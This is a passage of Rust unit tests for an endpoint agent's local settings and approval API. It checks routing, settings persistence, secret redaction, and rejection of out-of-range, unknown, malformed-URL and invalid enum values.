            match serde_json::from_str(r#"{"openclaw_active_gateway_id":"gw-1"}"#) {
                Ok(value) => value,
                Err(err) => panic!("failed to parse value payload: {}", err),
            };
        assert!(matches!(
            explicit_value.openclaw_active_gateway_id,
            Some(Some(value)) if value == "gw-1"
        ));
    }

    #[tokio::test]
    async fn approval_status_route_matches_uuid_path() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/approval/{id}/status", get(get_approval_status))
            .with_state(state);

        let request = axum::http::Request::builder()
            .uri("/api/v1/approval/550e8400-e29b-41d4-a716-446655440000/status")
            .header("authorization", "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build request: {e}"));

        let response = app
            .oneshot(request)
            .await
            .unwrap_or_else(|e| panic!("request failed: {e}"));

        // Should be 404 (approval not found) rather than 405/routing failure.
        assert_eq!(
            response.status(),
            StatusCode::NOT_FOUND,
            "Route should match the UUID path param and return 404 (not found), not a routing error"
        );
    }

    #[tokio::test]
    async fn settings_roundtrip_includes_dashboard_url() {
        let mut state = test_state();
        let keypair = Keypair::from_seed(&[219u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger::transient(
            keypair,
            format!("agent-enrollment:{signer_public_key}"),
        )));
        let state = Arc::new(state);

        let app = Router::new()
            .route(
                "/api/v1/agent/settings",
                get(get_settings).put(update_settings),
            )
            .with_state(state);

        // GET should return default dashboard_url.
        let get_req = axum::http::Request::builder()
            .uri("/api/v1/agent/settings")
            .header("authorization", "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build GET request: {e}"));

        let response = app
            .clone()
            .oneshot(get_req)
            .await
            .unwrap_or_else(|e| panic!("GET request failed: {e}"));

        assert_eq!(response.status(), StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap_or_else(|e| panic!("failed to read response body: {e}"));
        let json: serde_json::Value =
            serde_json::from_slice(&body).unwrap_or_else(|e| panic!("invalid JSON: {e}"));
        assert_eq!(
            json.get("dashboard_url").and_then(|v| v.as_str()),
            Some("http://127.0.0.1:9878/ui"),
            "GET should return default dashboard_url"
        );
        assert_eq!(
            json.get("ota_enabled").and_then(|v| v.as_bool()),
            Some(true),
            "GET should return default ota_enabled"
        );
        assert_eq!(
            json.get("control_api")
                .and_then(|v| v.get("enabled"))
                .and_then(|v| v.as_bool()),
            Some(false),
            "GET should return default disabled Control API postback settings"
        );

        // PUT should persist a custom dashboard_url and configured Control API postback settings.
        let put_req = axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/agent/settings")
            .header("authorization", "Bearer test-token")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                r#"{
                    "dashboard_url":"http://localhost:4200",
                    "control_api": {
                        "enabled": true,
                        "url": "http://127.0.0.1:3000",
                        "api_key": "configured-control-api-key"
                    }
                }"#,
            ))
            .unwrap_or_else(|e| panic!("failed to build PUT request: {e}"));

        let response = app
            .oneshot(put_req)
            .await
            .unwrap_or_else(|e| panic!("PUT request failed: {e}"));

        assert_eq!(response.status(), StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap_or_else(|e| panic!("failed to read PUT response body: {e}"));
        let json: serde_json::Value =
            serde_json::from_slice(&body).unwrap_or_else(|e| panic!("invalid JSON: {e}"));
        assert_eq!(
            json.get("dashboard_url").and_then(|v| v.as_str()),
            Some("http://localhost:4200"),
            "PUT should return updated dashboard_url"
        );
        assert_eq!(
            json.get("control_api")
                .and_then(|v| v.get("enabled"))
                .and_then(|v| v.as_bool()),
            Some(true)
        );
        assert_eq!(
            json.get("control_api")
                .and_then(|v| v.get("url"))
                .and_then(|v| v.as_str()),
            Some("http://127.0.0.1:3000")
        );
        assert_eq!(
            json.get("control_api")
                .and_then(|v| v.get("api_key_configured"))
                .and_then(|v| v.as_bool()),
            Some(true)
        );
        let json_text = serde_json::to_string(&json)
            .unwrap_or_else(|e| panic!("failed to serialize settings response: {e}"));
        assert!(!json_text.contains("configured-control-api-key"));
    }

    #[tokio::test]
    async fn settings_update_rejects_out_of_range_local_api_security_values() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/settings",
                get(get_settings).put(update_settings),
            )
            .with_state(state.clone());
        let default_dashboard_url = {
            let settings = state.settings.read().await;
            settings.dashboard_url.clone()
        };

        for (field, body, expected_range) in [
            (
                "local_api_security.token_rotation_interval_hours",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "local_api_security": {
                        "token_rotation_interval_hours": 0
                    }
                }),
                format!(
                    "between {LOCAL_API_TOKEN_ROTATION_MIN_HOURS} and {LOCAL_API_TOKEN_ROTATION_MAX_HOURS}"
                ),
            ),
            (
                "local_api_security.token_rotation_interval_hours",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "local_api_security": {
                        "token_rotation_interval_hours": LOCAL_API_TOKEN_ROTATION_MAX_HOURS + 1
                    }
                }),
                format!(
                    "between {LOCAL_API_TOKEN_ROTATION_MIN_HOURS} and {LOCAL_API_TOKEN_ROTATION_MAX_HOURS}"
                ),
            ),
            (
                "local_api_security.token_grace_minutes",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "local_api_security": {
                        "token_grace_minutes": 0
                    }
                }),
                format!(
                    "between {LOCAL_API_TOKEN_GRACE_MIN_MINUTES} and {LOCAL_API_TOKEN_GRACE_MAX_MINUTES}"
                ),
            ),
            (
                "local_api_security.token_grace_minutes",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "local_api_security": {
                        "token_grace_minutes": LOCAL_API_TOKEN_GRACE_MAX_MINUTES + 1
                    }
                }),
                format!(
                    "between {LOCAL_API_TOKEN_GRACE_MIN_MINUTES} and {LOCAL_API_TOKEN_GRACE_MAX_MINUTES}"
                ),
            ),
            (
                "local_api_security.mtls_port",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "local_api_security": {
                        "mtls_port": LOCAL_API_MTLS_MIN_PORT - 1
                    }
                }),
                format!("between {LOCAL_API_MTLS_MIN_PORT} and {}", u16::MAX),
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("PUT")
                .uri("/api/v1/agent/settings")
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| {
                    panic!("failed to build out-of-range settings request: {e}")
                });
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("out-of-range settings request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read out-of-range settings error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("out-of-range settings error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected out-of-range settings status for {field}: {error}"
            );
            assert!(
                error.contains(field) && error.contains(&expected_range),
                "unexpected out-of-range settings error for {field}: {error}"
            );

            let settings = state.settings.read().await;
            assert_eq!(settings.dashboard_url, default_dashboard_url);
            assert_eq!(
                settings.local_api_security.token_rotation_interval_hours,
                168
            );
            assert_eq!(settings.local_api_security.token_grace_minutes, 15);
            assert_eq!(settings.local_api_security.mtls_port, 9880);
        }
    }

    #[tokio::test]
    async fn settings_update_rejects_unknown_fields() {
        let app = Router::new()
            .route(
                "/api/v1/agent/settings",
                get(get_settings).put(update_settings),
            )
            .with_state(Arc::new(test_state()));

        for (field, body) in [
            (
                "dashboardURL",
                serde_json::json!({
                    "dashboardURL": "http://localhost:4200"
                }),
            ),
            (
                "controlApiUrl",
                serde_json::json!({
                    "control_api": {
                        "controlApiUrl": "http://127.0.0.1:3000"
                    }
                }),
            ),
            (
                "tokenGraceSeconds",
                serde_json::json!({
                    "local_api_security": {
                        "tokenGraceSeconds": 900
                    }
                }),
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("PUT")
                .uri("/api/v1/agent/settings")
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build unknown-field settings request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("unknown-field settings request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read unknown-field settings error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("unknown-field settings error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::UNPROCESSABLE_ENTITY,
                "unexpected unknown-field settings status for {field}: {error}"
            );
            assert!(
                error.contains("unknown field") && error.contains(field),
                "unexpected unknown-field settings error for {field}: {error}"
            );
        }
    }

    #[tokio::test]
    async fn settings_update_rejects_invalid_url_settings() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/settings",
                get(get_settings).put(update_settings),
            )
            .with_state(state.clone());
        let default_dashboard_url = {
            let settings = state.settings.read().await;
            settings.dashboard_url.clone()
        };

        for (field, body, message) in [
            (
                "dashboard_url",
                serde_json::json!({
                    "dashboard_url": "not a url"
                }),
                "must be a valid URL",
            ),
            (
                "dashboard_url",
                serde_json::json!({
                    "dashboard_url": "http://operator:secret@localhost:4200"
                }),
                "must not contain userinfo",
            ),
            (
                "control_api.url",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "control_api": {
                        "url": "http://control.example.invalid"
                    }
                }),
                "may use http only for loopback hosts",
            ),
            (
                "control_api.url",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "control_api": {
                        "url": "ftp://control.example.invalid"
                    }
                }),
                "must use http or https",
            ),
            (
                "ota_manifest_url",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "ota_manifest_url": "http://updates.example.invalid/manifest.json"
                }),
                "may use http only for loopback hosts",
            ),
            (
                "ota_manifest_url",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "ota_manifest_url": "https://operator:secret@updates.example.invalid/manifest.json"
                }),
                "must not contain userinfo",
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("PUT")
                .uri("/api/v1/agent/settings")
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build invalid-url settings request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("invalid-url settings request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read invalid-url settings error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("invalid-url settings error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected invalid-url settings status for {field}: {error}"
            );
            assert!(
                error.contains(field) && error.contains(message),
                "unexpected invalid-url settings error for {field}: {error}"
            );

            let settings = state.settings.read().await;
            assert_eq!(settings.dashboard_url, default_dashboard_url);
            assert!(settings.control_api.url.is_none());
            assert!(settings.ota_manifest_url.is_none());
        }
    }

    #[tokio::test]
    async fn settings_update_normalizes_known_enum_settings() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/settings",
                get(get_settings).put(update_settings),
            )
            .with_state(state.clone());
        let body = serde_json::json!({
            "notification_severity": "HIGH",
            "ota_mode": "MANUAL",
            "ota_channel": "Beta",
            "ota_check_interval_minutes": OTA_CHECK_INTERVAL_MIN_MINUTES
        });
        let req = axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/agent/settings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build normalized settings request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("normalized settings request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read normalized settings response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "unexpected normalized settings status: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode normalized settings response: {e}"));
        assert_eq!(payload["notification_severity"], "block");
        assert_eq!(payload["ota_mode"], "manual");
        assert_eq!(payload["ota_channel"], "beta");
        assert_eq!(
            payload["ota_check_interval_minutes"],
            OTA_CHECK_INTERVAL_MIN_MINUTES
        );
    }

    #[tokio::test]
    async fn settings_update_rejects_invalid_enum_and_interval_settings() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/settings",
                get(get_settings).put(update_settings),
            )
            .with_state(state.clone());
        let original = {
            let settings = state.settings.read().await;
            (
                settings.notification_severity.clone(),
                settings.ota_mode.clone(),
                settings.ota_channel.clone(),
                settings.ota_check_interval_minutes,
            )
        };

        for (field, body, message) in [
            (
                "notification_severity",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "notification_severity": "everything"
                }),
                "must be one of info, warn, or block".to_string(),
            ),
            (
                "ota_mode",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "ota_mode": "always"
                }),
                "must be one of auto or manual".to_string(),
            ),
            (
                "ota_channel",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "ota_channel": "nightly"
                }),
                "must be one of stable or beta".to_string(),
            ),
            (
                "ota_check_interval_minutes",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "ota_check_interval_minutes": OTA_CHECK_INTERVAL_MIN_MINUTES - 1
                }),
                format!(
                    "between {OTA_CHECK_INTERVAL_MIN_MINUTES} and {OTA_CHECK_INTERVAL_MAX_MINUTES}"
                ),
            ),
            (
                "ota_check_interval_minutes",
                serde_json::json!({
                    "dashboard_url": "http://localhost:4999/invalid",
                    "ota_check_interval_minutes": OTA_CHECK_INTERVAL_MAX_MINUTES + 1
                }),
                format!(
                    "between {OTA_CHECK_INTERVAL_MIN_MINUTES} and {OTA_CHECK_INTERVAL_MAX_MINUTES}"
                ),
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("PUT")
                .uri("/api/v1/agent/settings")
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| {
                    panic!("failed to build invalid enum/interval settings request: {e}")
                });
            let response =
                app.clone().oneshot(req).await.unwrap_or_else(|e| {
                    panic!("invalid enum/interval settings request failed: {e}")
                });
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| {
                    panic!("failed to read invalid enum/interval settings error: {e}")
                });
            let error = String::from_utf8(bytes.to_vec()).unwrap_or_else(|e| {
                panic!("invalid enum/interval settings error is not utf8: {e}")
            });
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected invalid enum/interval settings status for {field}: {error}"
            );
            assert!(
                error.contains(field) && error.contains(&message),
                "unexpected invalid enum/interval settings error for {field}: {error}"
            );

            let settings = state.settings.read().await;
            assert_eq!(settings.notification_severity, original.0);
            assert_eq!(settings.ota_mode, original.1);
            assert_eq!(settings.ota_channel, original.2);
            assert_eq!(settings.ota_check_interval_minutes, original.3);
        }
    }
